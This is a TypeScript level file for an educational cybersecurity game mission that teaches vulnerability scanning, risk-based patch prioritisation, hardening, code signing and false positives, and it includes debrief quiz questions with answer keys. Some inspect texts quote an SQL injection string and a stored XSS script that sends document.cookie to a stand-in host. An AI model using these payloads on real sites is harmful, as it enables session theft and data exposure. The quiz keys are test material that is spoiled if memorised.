import type { Mission } from '../../core/types';
import { lightRects } from '../../missions/levelkit';
import type { WalkStep } from '../../missions/walkthroughs';
import type { MissionTeaching } from '../curriculum';
import { q } from '../arc-questions';
import { addThreatEncounter, mixedThreatEncounter, floorSpot, liveThreats, retex } from './campaign-map';

export const m08: Mission = {
  id: 'm08',
  title: 'ZERO DAY',
  difficulty: 8,
  objectives: ['2.3', '4.3', '4.1'],
  briefing:
    'Exploit chatter on a threat feed names your stack. You have until the next shift to close the holes. ' +
    'Your kit: MOUSE (2) inspects, KEYBOARD (1) operates consoles and patches, USB SCANNER (3) cleans malware, ' +
    'BADGE (4) opens doors your role covers.',
  authorizedRoles: ['analyst'],
  loadout: ['keyboard', 'mouse', 'usb', 'badge', 'edr'],
  map: {
    grid: [
    '##############################################',
    '##############################################',
    '##................####................########',
    '##................####................########',
    '##BBBB..B.........####..SS..SS.SS.SSSS########',
    '##...B..B.........####............S...########',
    '##...B..B.........####..SS..SS.SS.S...########',
    '##...1..B.........####............2...########',
    '##...B............####..SS..SS.SS.S...########',
    '##...B............####............S...########',
    '##BBBB............####............SSSS########',
    '##................####................##..####',
    '########D#####################V#########4#####',
    '##....................................##.#####',
    '##.......BB...B............B..........T...####',
    '##.......BB...........................###..###',
    '##....................B...............####..##',
    '##............................B.......#####.##',
    '##....................................##....##',
    '##...................................U......##',
    '##....................................##....##',
    '#######.###############X################....##',
    '##...........#######........##############5###',
    '##...........#######........##############...#',
    '##...........#######...E....##############...#',
    '##...........#######........##################',
    '##...........#######........##################',
    '##...........#######........##################',
    '##############################################',
    '##############################################',
  ],
    legend: {
      '#': { kind: 'wall', tex: 'wall-panel' },
      S: { kind: 'wall', tex: 'wall-server' },
      B: { kind: 'wall', tex: 'wall-brick' },
      '.': { kind: 'floor', tex: 'floor' },
      D: { kind: 'door', tex: 'door', doorId: 'dmz-access', accessRole: 'change' },
      V: { kind: 'door', tex: 'door', doorId: 'server-access', accessRole: 'change' },
      X: {
        kind: 'door',
        tex: 'door',
        doorId: 'exit',
        locked: true,
        lockText: 'Exit opens after a clean validation rescan.',
      },
      '1': { kind: 'door', tex: 'wall-brick', doorId: 'secret-dmz', secret: true },
      '2': { kind: 'door', tex: 'wall-server', doorId: 'secret-server', secret: true },
      E: { kind: 'exit', tex: 'exit' },
    },
    spawn: { x: 5.5, y: 25.5, angle: -1.107 },
    defaultLight: 0.6,
    lights: lightRects([
      [2, 22, 12, 27, 0.9],
      [2, 2, 17, 11, 0.55],
      [22, 2, 37, 11, 0.55],
      [2, 13, 37, 20, 0.45],
      [20, 22, 27, 27, 0.8],
      [2, 5, 5, 9, 0.4],
      [34, 5, 37, 9, 0.4],
    ]),
  },
  entities: [
    {
      id: 'vuln-scan',
      kind: 'console',
      x: 5.5,
      y: 24.5,
      sprite: 'workstation',
      tags: ['vuln-scan'],
      grants: { resource: 'role:change', amount: 1 },
      inspect: {
        label: 'Vulnerability scanner',
        detail: 'Vulnerability findings and an open change window.',
        category: 'legit',
        objectives: ['4.3'],
      },
      log: 'VULN SCAN 05:10 - 4 findings\n' +
        'WEB-01 storefront   SQL injection       CVSS 8.2\n' +
        'FILE-02 file server SMB buffer overflow CVSS 9.8\n' +
        'HR-03 intranet      stored XSS          CVSS 5.4\n' +
        'LAB-04 test box     kernel race cond.   CVSS 7.0 (banner match)\n' +
        'Change window open: CHANGE role granted.',
    },
    {
      id: 'web01',
      kind: 'console',
      x: 11.5,
      y: 8.5,
      sprite: 'workstation',
      priority: 1,
      tags: ['vuln-host', 'vuln-fix'],
      inspect: {
        label: 'Server WEB-01 (storefront)',
        category: 'legit',
        objectives: ['2.3', '4.3'],
        detail: "Exposure: internet, 443 open to any source. WAF log: GET /search?q=' OR '1'='1 returned 2,113 customer rows. Threat feed 04:50: this storefront plugin version is being mass-exploited right now.",
      },
      log: 'Vendor fix deployed (package signed by the vendor, signature valid): /search now uses parameterized queries. WEB-01 patched.',
    },
    {
      id: 'file02',
      kind: 'console',
      x: 23.5,
      y: 5.5,
      sprite: 'workstation',
      priority: 2,
      tags: ['vuln-host', 'vuln-fix'],
      inspect: {
        label: 'Server FILE-02 (file shares)',
        category: 'legit',
        objectives: ['2.3', '4.3'],
        detail: 'Exposure: server VLAN only, no internet route. Crash dump: SMB service, instruction pointer overwritten with 0x41414141 after a 4,096-byte request field. No public exploit yet. Holds every department share.',
      },
      log: 'Vendor SMB update installed (signed). FILE-02 patched.',
    },
    {
      id: 'hr03',
      kind: 'console',
      x: 27.5,
      y: 5.5,
      sprite: 'workstation',
      priority: 3,
      tags: ['vuln-host', 'vuln-fix'],
      inspect: {
        label: 'Server HR-03 (intranet)',
        category: 'legit',
        objectives: ['2.3', '4.3'],
        detail: "Exposure: staff intranet only. Page source of /comments: <script>fetch('//x.example/c?'+document.cookie)</script> saved in a comment and served to every reader. CVSS 5.4.",
      },
      log: 'Output encoding enabled on /comments; stored script now renders as text. HR-03 patched.',
    },
    {
      id: 'lab04',
      kind: 'console',
      x: 30.5,
      y: 5.5,
      sprite: 'workstation',
      tags: ['vuln-host', 'decoy'],
      inspect: {
        label: 'Server LAB-04 (test box)',
        category: 'legit',
        objectives: ['2.3', '4.3'],
        detail: 'Scanner matched the kernel version banner only. Credentialed check: package changelog shows the race-condition (time-of-check/time-of-use) fix backported in build -513, which is installed. No sensitive data.',
      },
      log: 'Change applied to LAB-04: nothing to install, the fix was already present. Change window wasted.',
    },
    {
      id: 'svc-web',
      kind: 'console',
      x: 15.5,
      y: 8.5,
      sprite: 'workstation',
      tags: ['baseline'],
      inspect: {
        label: 'WEB-01 service list',
        category: 'legit',
        objectives: ['4.1'],
        detail: 'Listening: 443 (storefront), 21 FTP, 23 Telnet, 8080 admin console open to the internet. Benchmark: only required services.',
      },
      log: 'Baseline applied: FTP, Telnet and internet-facing 8080 disabled. Only 443 remains.',
    },
    {
      id: 'sign-gate',
      kind: 'console',
      x: 25.5,
      y: 9.5,
      sprite: 'workstation',
      tags: ['baseline'],
      inspect: {
        label: 'Deploy pipeline',
        category: 'legit',
        objectives: ['4.1'],
        detail: 'Release policy: any build may be deployed; signatures not checked.',
      },
      log: 'Policy set: only code-signed builds from the vendor or our CI may deploy.',
    },
    {
      id: 'forum-hotfix',
      kind: 'console',
      x: 13.5,
      y: 8.5,
      sprite: 'workstation',
      tags: ['unsigned'],
      inspect: {
        label: 'HOTFIX_web01.zip',
        category: 'legit',
        objectives: ['4.1'],
        detail: 'Downloaded from a forum mirror. Signature: none. Readme: works great, disable antivirus before running!!',
      },
      log: 'Unsigned hotfix executed on WEB-01.',
    },
    {
      id: 'rescan',
      kind: 'console',
      x: 9.5,
      y: 24.5,
      sprite: 'workstation',
      tags: ['rescan'],
      inspect: {
        label: 'Validation rescan',
        category: 'legit',
        objectives: ['4.3'],
        detail: 'Re-runs the credentialed scan against all four hosts.',
      },
      log: 'RESCAN 06:40: WEB-01, FILE-02, HR-03 clear. LAB-04 confirmed false positive. 0 open findings.',
    },
    {
      id: 'trojan-a',
      kind: 'enemy',
      x: 15.5,
      y: 3.5,
      sprite: 'trojan',
      ai: 'chase',
      hp: 3,
      infected: true,
      dormant: true,
      tags: ['malware'],
      inspect: { label: 'Remote access trojan', detail: 'Exploit traffic established an attacker session.', category: 'malware', objectives: ['2.4'] },
    },
    {
      id: 'trojan-b',
      kind: 'enemy',
      x: 16.5,
      y: 9.5,
      sprite: 'trojan',
      ai: 'chase',
      hp: 3,
      infected: true,
      dormant: true,
      tags: ['malware'],
      inspect: { label: 'Remote access trojan', detail: 'Exploit traffic established an attacker session.', category: 'malware', objectives: ['2.4'] },
    },
    {
      id: 'worm-a',
      kind: 'enemy',
      x: 18.5,
      y: 16.5,
      sprite: 'worm',
      ai: 'wander',
      hp: 2,
      infected: true,
      tags: ['malware'],
      inspect: { label: 'Network worm', detail: 'The worm is moving through the shared corridor.', category: 'malware', objectives: ['2.4'] },
    },
    {
      id: 'worm-b',
      kind: 'enemy',
      x: 31.5,
      y: 18.5,
      sprite: 'worm',
      ai: 'wander',
      hp: 2,
      infected: true,
      tags: ['malware'],
      inspect: { label: 'Network worm', detail: 'The worm is moving through the shared corridor.', category: 'malware', objectives: ['2.4'] },
    },
    {
      id: 'server-worm-a',
      kind: 'enemy',
      x: 23.5,
      y: 3.5,
      sprite: 'worm',
      ai: 'chase',
      hp: 2,
      infected: true,
      dormant: true,
      tags: ['malware'],
      inspect: { label: 'Network worm', detail: 'The worm was dormant in the server room.', category: 'malware', objectives: ['2.4'] },
    },
    {
      id: 'server-worm-b',
      kind: 'enemy',
      x: 32.5,
      y: 9.5,
      sprite: 'worm',
      ai: 'chase',
      hp: 2,
      infected: true,
      dormant: true,
      tags: ['malware'],
      inspect: { label: 'Network worm', detail: 'The worm was dormant in the server room.', category: 'malware', objectives: ['2.4'] },
    },
    {
      // EDR is issued now, so the floor find is the patch kit this mission teaches
      id: 'find-patch',
      kind: 'item',
      x: 3.5,
      y: 23.5,
      sprite: 'tool-patch',
      tags: ['arsenal-pickup'],
      grants: { resource: 'tool:patch', amount: 1 },
      inspect: { label: 'Patch disk kit (found)', detail: 'Bootable patch media: vendor security updates you can install by hand.', category: 'item', objectives: ['4.3'] },
    },
    {
      id: 'patch-disk-lobby',
      kind: 'item',
      x: 8.5,
      y: 23.5,
      sprite: 'patch-disk',
      tags: ['arsenal-pickup'],
      grants: { resource: 'patch-disk', amount: 2 },
      inspect: { label: 'Patch disks', detail: 'Two vendor security updates on disk.', category: 'item', objectives: ['4.3'] },
    },
    {
      id: 'patch-disk-corridor',
      kind: 'item',
      x: 5.5,
      y: 25.5,
      sprite: 'patch-disk',
      tags: ['arsenal-pickup'],
      grants: { resource: 'patch-disk', amount: 1 },
      inspect: { label: 'Patch disk', detail: 'A vendor security update on disk.', category: 'item', objectives: ['4.3'] },
    },
    {
      id: 'edr-cell-soc',
      kind: 'item',
      x: 11.5,
      y: 23.5,
      sprite: 'edr-cell',
      tags: ['arsenal-pickup'],
      grants: { resource: 'edr-cell', amount: 1 },
      inspect: { label: 'EDR cell', detail: 'Licence and compute for one EDR containment pulse.', category: 'item', objectives: ['4.5'] },
    },
    {
      id: 'edr-cell-dmz',
      kind: 'item',
      x: 4.5,
      y: 8.5,
      sprite: 'edr-cell',
      tags: ['arsenal-pickup'],
      grants: { resource: 'edr-cell', amount: 1 },
      inspect: { label: 'EDR cell', detail: 'Licence and compute for one EDR containment pulse.', category: 'item', objectives: ['4.5'] },
    },
    {
      id: 'edr-cell-server',
      kind: 'item',
      x: 35.5,
      y: 8.5,
      sprite: 'edr-cell',
      tags: ['arsenal-pickup'],
      grants: { resource: 'edr-cell', amount: 2 },
      inspect: { label: 'EDR cells', detail: 'Licence and compute for two EDR containment pulses.', category: 'item', objectives: ['4.5'] },
    },
    {
      id: 'usb-charge-soc',
      kind: 'item',
      x: 3.5,
      y: 26.5,
      sprite: 'charge',
      tags: ['arsenal-pickup'],
      grants: { resource: 'usb-charge', amount: 4 },
      inspect: { label: 'Scanner charges', detail: 'Antimalware definitions for the USB scanner.', category: 'item' },
    },
    {
      id: 'usb-charge-dmz',
      kind: 'item',
      x: 3.5,
      y: 8.5,
      sprite: 'charge',
      tags: ['arsenal-pickup'],
      grants: { resource: 'usb-charge', amount: 4 },
      inspect: { label: 'Scanner charges', detail: 'Antimalware definitions for the USB scanner.', category: 'item' },
    },
    {
      id: 'usb-charge-server',
      kind: 'item',
      x: 36.5,
      y: 8.5,
      sprite: 'charge',
      tags: ['arsenal-pickup'],
      grants: { resource: 'usb-charge', amount: 4 },
      inspect: { label: 'Scanner charges', detail: 'Antimalware definitions for the USB scanner.', category: 'item' },
    },
    {
      id: 'medkit-dmz',
      kind: 'item',
      x: 3.5,
      y: 6.5,
      sprite: 'medkit',
      grants: { resource: 'integrity', amount: 25 },
      inspect: { label: 'Integrity kit', detail: 'Restores 25 integrity.', category: 'item' },
    },
    {
      id: 'medkit-server',
      kind: 'item',
      x: 36.5,
      y: 6.5,
      sprite: 'medkit',
      grants: { resource: 'integrity', amount: 25 },
      inspect: { label: 'Integrity kit', detail: 'Restores 25 integrity.', category: 'item' },
    },
  ],
  missionObjectives: [
    { id: 'scan', text: 'Run the vulnerability scan (SOC)', kind: 'interact', tag: 'vuln-scan' },
    { id: 'analyze', text: 'Analyze every flagged server', kind: 'inspect', tag: 'vuln-host', count: 4, requires: ['scan'] },
    { id: 'remediate', text: 'Remediate the findings in risk order', kind: 'interact', tag: 'vuln-fix', count: 3, ordered: true, requires: ['analyze'] },
    { id: 'harden', text: 'Harden to the secure baseline', kind: 'interact', tag: 'baseline', count: 2, requires: ['scan'] },
    { id: 'no-unsigned', text: 'Never deploy unsigned code', kind: 'avoid', tag: 'unsigned' },
    { id: 'rescan', text: 'Rescan to validate', kind: 'interact', tag: 'rescan', requires: ['remediate', 'harden'] },
    { id: 'exit', text: 'Reach the exit', kind: 'reach-exit' },
  ],
  debriefQuestions: [
    q('q1', ['2.3'], 'Entering  \' OR \'1\'=\'1  in a login form returns every user record. What is the vulnerability, and what fixes it?', 0, [
      ['SQL injection; use parameterized queries and input validation', 'The input became part of the SQL statement. Parameterization keeps user data separate from query code.'],
      ['Cross-site scripting; encode output', 'XSS runs script in a victim\u2019s browser. Here the database query itself was altered.'],
      ['Buffer overflow; enable memory protections', 'Nothing overran a memory buffer. The query logic was rewritten.'],
      ['Directory traversal; restrict file paths', 'Traversal uses ../ to reach files outside the web root, but this attack changed a database query.'],
    ]),
    q('q2', ['2.3'], 'A setuid program checks that the user may write /tmp/report, then opens it. Between the check and the open, the attacker swaps the file for a link to /etc/passwd. What is this?', 3, [
      ['Memory injection', 'Memory injection puts code into a running process\u2019s memory. Here a file was swapped.'],
      ['Malicious update', 'No update channel is involved.'],
      ['Buffer overflow', 'No data overran a buffer. The flaw is the gap between check and use.'],
      ['Race condition (time-of-check / time-of-use)', 'The resource changed between the check (TOC) and the use (TOU), which is the textbook race condition.'],
    ]),
    q('q3', ['4.3'], 'Two findings: CVSS 9.8 on an isolated lab server with no sensitive data, and CVSS 7.5 on the internet-facing payment portal. What do you remediate FIRST?', 1, [
      ['The 9.8, because the highest base score always goes first', 'The CVSS base score ignores your environment. Exposure and impact can outweigh a higher base score.'],
      ['The 7.5 payment portal, because exposure and impact make its real risk higher', 'Prioritization adds environmental factors to the base score: who can reach it and what is at stake.'],
      ['Neither until both can be patched in one window', 'Delaying an exposed payment system to batch changes increases risk.'],
      ['Whichever is cheaper to fix', 'Cost matters in planning, but risk drives priority.'],
    ]),
    q('q4', ['4.1'], 'Twenty new web servers must start from a known-good, hardened configuration that is checked for drift over time. What should you implement?', 2, [
      ['Let each admin harden servers to personal preference', 'That produces inconsistent configurations, with no reference to measure drift against.'],
      ['Install every package so nothing is missing later', 'Unneeded software is extra attack surface. Hardening removes it.'],
      ['A secure baseline (e.g. from a CIS benchmark): establish, deploy, maintain', 'A baseline defines the hardened state, deploys it consistently, and is monitored and updated as threats change.'],
      ['Harden servers only after an incident', 'Reactive hardening means the first attacker gets the weak configuration.'],
    ]),
    q('q5', ['4.1'], 'Production servers must run only approved builds that have not been modified since release. Which technique verifies this at install time?', 0, [
      ['Code signing', 'A valid signature proves who published the build and that it has not been altered since it was signed.'],
      ['Static code analysis', 'Static analysis finds flaws in the source before release. It cannot prove the deployed binary is unmodified.'],
      ['Sandboxing', 'A sandbox isolates what code can do when it runs. It does not verify where the code came from.'],
      ['Secure cookies', 'Secure cookies protect session tokens in the browser and have nothing to do with build integrity.'],
    ]),
    q('q6', ['4.3'], 'A scan flags a kernel race condition on a test server based on the version banner, but a credentialed check shows the vendor backported the fix. What is this finding, and what do you do?', 1, [
      ['A true positive; patch it immediately', 'The vendor fix is already installed, so another patch changes nothing and wastes the change window.'],
      ['A false positive; document it and exclude it after confirming with the credentialed check', 'Banner-only matches can misfire on backported fixes; confirm with the credentialed check, then record the false positive so it does not keep re-alerting.'],
      ['A false negative; rescan with more plugins', 'A false negative means a real vulnerability was missed, the opposite of this confirmed fixed system.'],
      ['An accepted risk; file a risk exception', 'There is no remaining vulnerability to accept as risk; the credentialed check confirms the fix is present.'],
    ]),
  ],
  script: {
    par: 240,
    triggers: [
      {
        id: 'dmz-exploit-traffic',
        area: [2, 2, 17, 11],
        spawn: ['trojan-a', 'trojan-b'],
        kind: 'warn',
        message: 'Exploit traffic: bots are hammering the unpatched storefront!',
      },
      {
        id: 'server-room-worms',
        area: [22, 2, 37, 11],
        spawn: ['server-worm-a', 'server-worm-b'],
        kind: 'warn',
        message: 'Dormant worms wake in the server room!',
      },
      {
        id: 'validated-exit',
        after: ['rescan'],
        openDoors: ['exit'],
        kind: 'good',
        message: 'Rescan clean: findings validated. Exit open.',
      },
    ],
    secrets: [
      { id: 'dmz-closet', area: [2, 5, 4, 9], label: 'DMZ supply closet', grant: { resource: 'integrity', amount: 40 } },
      { id: 'server-closet', area: [35, 5, 37, 9], label: 'Server room supply closet', grant: { resource: 'tool:patch', amount: 1 } },
    ],
  },
};

export const m08Walkthrough: WalkStep[] = [
  { interact: 'vuln-scan' },
  { badge: [8, 12] },
  { goto: [8, 11] },
  { goto: [11, 8] },
  { inspect: 'web01' },
  { badge: [30, 12] },
  { goto: [30, 11] },
  { goto: [24, 5] },
  { inspect: 'file02' },
  { goto: [27, 5] },
  { inspect: 'hr03' },
  { goto: [30, 5] },
  { inspect: 'lab04' },
  { goto: [25, 9] },
  { interact: 'sign-gate' },
  { goto: [11, 8] },
  { interact: 'web01' },
  { goto: [15, 8] },
  { interact: 'svc-web' },
  { goto: [24, 5] },
  { interact: 'file02' },
  { goto: [27, 5] },
  { interact: 'hr03' },
  { goto: [9, 24] },
  { interact: 'rescan' },
  { wait: 0.2 },
  { goto: [23, 24] },
];

export const m08Teach: MissionTeaching = {
  tagline: 'Exploit chatter names your stack. The change window closes at dawn.',
  situation: 'A vulnerability scan has found four defects across the storefront, file server, intranet and a test box. The change window closes at dawn, and exploit traffic is already reaching the storefront.',
  orders: [
    { text: 'Scan, then read every flagged server yourself.', objective: '4.3' },
    { text: 'Fix what attackers can reach and are using first.', objective: '4.3' },
    { text: 'Lock the servers to baseline and prove the fixes held.', objective: '4.1' },
  ],
  keyTerms: [
    'vulnerability scan',
    'CVSS',
    'SQL injection',
    'buffer overflow',
    'cross-site scripting',
    'race condition',
    'secure baseline',
    'code signing',
    'false positive',
    'patching',
    'hardening',
  ],
  lessons: {
    scan: {
      objective: '4.3',
      done: 'The scanner found four candidates and opened the CHANGE window. A scan starts vulnerability management; it does not prove every match is exploitable.',
      missed: 'The scan was never run, so the findings were not reviewed and the authorized change window never opened.',
    },
    analyze: {
      objective: '2.3',
      done: 'The WAF rows show SQL injection on WEB-01; the overwritten instruction pointer shows a buffer overflow on FILE-02; page source shows stored cross-site scripting on HR-03; and the test-box changelog identifies a backported race-condition fix.',
      missed: 'Remediation was refused until all four flagged servers were inspected. Read the WAF log, crash dump, page source and changelog to classify each flaw from evidence.',
    },
    remediate: {
      objective: '4.3',
      done: 'WEB-01 came first: it is internet-exposed and actively mass-exploited, with customer data at risk, despite FILE-02 having the higher base CVSS. Prioritize with base score, exposure, threat intelligence and impact together. FILE-02 was next: its 9.8 buffer overflow threatens every department share. HR-03, the intranet-only stored XSS, came last.',
      missed: 'Patch by contextual risk, not the largest base CVSS alone. WEB-01 is exposed and being exploited now; FILE-02 is a high-impact 9.8 finding; HR-03 is intranet-only and lower impact.',
    },
    harden: {
      objective: '4.1',
      done: 'The secure baseline removed unnecessary FTP, Telnet and internet-facing administration, then limited deployment to code-signed vendor or CI builds.',
      missed: 'Hardening means reducing attack surface to an approved baseline: disable unneeded services and require valid code signatures before deployment.',
    },
    'no-unsigned': {
      objective: '4.1',
      done: 'You rejected the forum hotfix. An unsigned archive has no verified publisher or integrity; running it could install tampered code.',
      missed: 'The forum hotfix was unsigned and asked you to disable antivirus. Without a trusted signature, you cannot verify its source or that the code was not altered; deploying it failed the mission.',
    },
    rescan: {
      objective: '4.3',
      done: 'The validation rescan confirmed WEB-01, FILE-02 and HR-03 clear and LAB-04 a confirmed false positive. Rescanning, auditing and verifying remediation are part of vulnerability management.',
      missed: 'You did not validate the changes. Rescan after remediation to prove the findings are closed and the banner-only match is a false positive.',
    },
    exit: {
      objective: '4.3',
      done: 'The clean validation rescan opened the exit. Verified remediation closes the vulnerability-management loop.',
      missed: 'The exit stays locked until the required fixes and secure baseline are validated with a rescan.',
    },
    'false-positive': {
      objective: '4.3',
      done: 'LAB-04 matched a kernel version banner, but the credentialed check and changelog confirmed the race-condition fix had been backported and installed. Document and exclude a confirmed false positive.',
      missed: 'The banner match alone was not proof of a vulnerable kernel. Confirm with credentialed evidence: the backported fix was already installed, so patching LAB-04 wasted the change window.',
    },
    'priority-miss': {
      objective: '4.3',
      done: 'You followed the change board. A CVSS base score alone ignores the environment; exposure, active exploitation, affected data and business impact determine local risk.',
      missed: 'You tried a lower-priority finding first. CVSS base scores do not account for environment; consider exposure and threat intelligence before changing systems.',
    },
  },
  examTip: 'Prioritize with CVSS plus exposure, exploitation threat intelligence and impact. Confirm banner-only findings with credentialed evidence, then validate remediation with a rescan.',
};

// F1: encounter pacing — opening skirmish at the lobby, room reveals,
// an exit-room ransomware reveal, and supplies.
liveThreats(m08, 'open-trojan', 'trojan', 1, [14, 13, 37, 20]);
addThreatEncounter(m08, 'office-worm', 'worm', 5, {
  id: 'office-ambush', area: [2, 2, 17, 11], kind: 'bad',
  message: 'Zero-day worms churn through the west office.',
}, [2, 2, 17, 11]);
addThreatEncounter(m08, 'server-worm', 'worm', 2, {
  id: 'server-ambush-a', area: [22, 2, 37, 11], kind: 'bad',
  message: 'The lab racks were seeded — worms in the server rows.',
}, [22, 2, 37, 11]);
addThreatEncounter(m08, 'server-rk', 'rootkit', 3, {
  id: 'server-ambush-b', area: [22, 2, 37, 11], kind: 'bad',
}, [22, 2, 37, 11]);
addThreatEncounter(m08, 'hall-trojan', 'trojan', 6, {
  id: 'hall-ambush', area: [2, 13, 37, 20], kind: 'bad',
  message: 'Trojans spill into the central hall.',
}, [2, 13, 37, 20]);
addThreatEncounter(m08, 'exit-rs', 'ransomware', 4, {
  id: 'exit-ambush', area: [18, 22, 27, 27], kind: 'bad',
  message: 'Ransomware detonates around the exit room!',
}, [18, 22, 27, 27]);
addThreatEncounter(m08, 'sw-worm', 'worm', 1, {
  id: 'lobby-ambush', area: [2, 22, 12, 27], kind: 'bad',
  message: 'The lobby was not safe — worms behind the front desk.',
}, [7, 22, 12, 27]);
m08.entities.push(
  { id: 'chg-w', kind: 'item', ...floorSpot(m08, [2, 2, 17, 11]), sprite: 'charge', tags: ['arsenal-pickup'],
    grants: { resource: 'usb-charge', amount: 8 }, inspect: { label: 'Scan sessions', detail: 'Boot-and-quarantine sessions for the USB scanner.', category: 'item' } },
  { id: 'chg-e', kind: 'item', ...floorSpot(m08, [22, 2, 37, 11]), sprite: 'charge', tags: ['arsenal-pickup'],
    grants: { resource: 'usb-charge', amount: 8 }, inspect: { label: 'Scan sessions', detail: 'Boot-and-quarantine sessions for the USB scanner.', category: 'item' } },
  { id: 'chg-c', kind: 'item', ...floorSpot(m08, [14, 13, 37, 20]), sprite: 'charge', tags: ['arsenal-pickup'],
    grants: { resource: 'usb-charge', amount: 8 }, inspect: { label: 'Scan sessions', detail: 'Boot-and-quarantine sessions for the USB scanner.', category: 'item' } },
  { id: 'chg-s', kind: 'item', ...floorSpot(m08, [2, 22, 12, 27]), sprite: 'charge', tags: ['arsenal-pickup'],
    grants: { resource: 'usb-charge', amount: 8 }, inspect: { label: 'Scan sessions', detail: 'Boot-and-quarantine sessions for the USB scanner.', category: 'item' } },
  { id: 'med-c', kind: 'item', ...floorSpot(m08, [14, 13, 37, 20]), sprite: 'medkit',
    grants: { resource: 'integrity', amount: 25 }, inspect: { label: 'Integrity kit', detail: 'Restores 25 integrity.', category: 'item' } },
);

m08.entities.push(
  { id: 'chg-x1', kind: 'item', ...floorSpot(m08, [2, 2, 17, 11]), sprite: 'charge', tags: ['arsenal-pickup'],
    grants: { resource: 'usb-charge', amount: 8 }, inspect: { label: 'Scan sessions', detail: 'Boot-and-quarantine sessions for the USB scanner.', category: 'item' } },
  { id: 'chg-x2', kind: 'item', ...floorSpot(m08, [14, 13, 37, 20]), sprite: 'charge', tags: ['arsenal-pickup'],
    grants: { resource: 'usb-charge', amount: 8 }, inspect: { label: 'Scan sessions', detail: 'Boot-and-quarantine sessions for the USB scanner.', category: 'item' } },
  { id: 'chg-x3', kind: 'item', ...floorSpot(m08, [22, 2, 37, 11]), sprite: 'charge', tags: ['arsenal-pickup'],
    grants: { resource: 'usb-charge', amount: 8 }, inspect: { label: 'Scan sessions', detail: 'Boot-and-quarantine sessions for the USB scanner.', category: 'item' } },
);

// — rF2 landmarks: east server hall = bright grid floor + console row; west
// DMZ offices + south briefing room = dim rust floors.
m08.map.legend[','] = { kind: 'floor', tex: 'floor-grid' };
m08.map.legend[';'] = { kind: 'floor', tex: 'floor-rust' };
retex(m08, [28, 4, 38, 11], 'floor', ',');
retex(m08, [2, 4, 14, 11], 'floor', ';');
retex(m08, [2, 21, 15, 27], 'floor', ';');
m08.map.lights = { ...m08.map.lights, ...lightRects([[28, 4, 38, 10, 0.85], [2, 21, 15, 27, 0.55]]) };
m08.entities.push(
  { id: 'noc-wall-a', kind: 'prop', x: 31.5, y: 7.5, sprite: 'console' },
  { id: 'noc-wall-b', kind: 'prop', x: 36.5, y: 7.5, sprite: 'console' },
  { id: 'dmz-desk', kind: 'prop', x: 6.5, y: 6.5, sprite: 'workstation' },
);

// rF4: 46x30 silhouette — east staircase lab (descending step cells into a
// sample-analysis room) with a locked post-remediation shortcut back into the
// main hall and two secret sample lockers.
m08.map.legend.T = { kind: 'door', tex: 'door', doorId: 'rf4-stair' };
m08.map.legend.U = { kind: 'door', tex: 'door', doorId: 'rf4-stair-loop', locked: true,
  lockText: 'The lab shortcut unlocks once the zero-day is remediated.' };
m08.map.legend['4'] = { kind: 'door', tex: 'wall-secret', secret: true, doorId: 'rf4-sample-locker' };
m08.map.legend['5'] = { kind: 'door', tex: 'wall-secret', secret: true, doorId: 'rf4-cold-locker' };
m08.entities.push(
  { id: 'rf4-sample-item', kind: 'item', x: 40.5, y: 11.5, sprite: 'charge', tags: ['arsenal-pickup'],
    grants: { resource: 'usb-charge', amount: 8 } },
  { id: 'rf4-cold-item', kind: 'item', x: 43.5, y: 23.5, sprite: 'medkit' },
);
m08.script!.secrets!.push(
  { id: 'rf4-sample-locker', area: [40, 11, 41, 11], label: 'Sample quarantine locker', grant: { resource: 'usb-charge', amount: 8 } },
  { id: 'rf4-cold-locker', area: [42, 23, 44, 24], label: 'Cold-room evidence store', grant: { resource: 'integrity', amount: 20 } },
);
mixedThreatEncounter(m08, 'stair-mix', [['worm', 3], ['rat', 2]],
  { id: 'stair-ambush', area: [40, 18, 43, 21], kind: 'bad',
    message: 'The analysis room is still infected — variants crawl up the stair.' },
  [40, 13, 43, 21]);
addThreatEncounter(m08, 'rescan-wave', 'worm', 4,
  { id: 'rescan-wave', after: ['rescan'], kind: 'warn',
    message: 'Rescan triggered a dormant variant — fresh signatures dropping into the hall.' },
  [2, 13, 36, 20]);
m08.script!.triggers!.push({ id: 'stair-loop-open', after: ['remediate'], kind: 'good',
  message: 'Remediation applied — the lab shortcut back to the hall is open.',
  openDoors: ['rf4-stair-loop'] });
m08.map.lights = { ...m08.map.lights, ...lightRects([[40, 13, 43, 21, 0.6], [40, 11, 41, 11, 0.85], [42, 23, 44, 24, 0.85], [40, 13, 40, 13, 0.35], [42, 21, 42, 21, 0.35]]) };
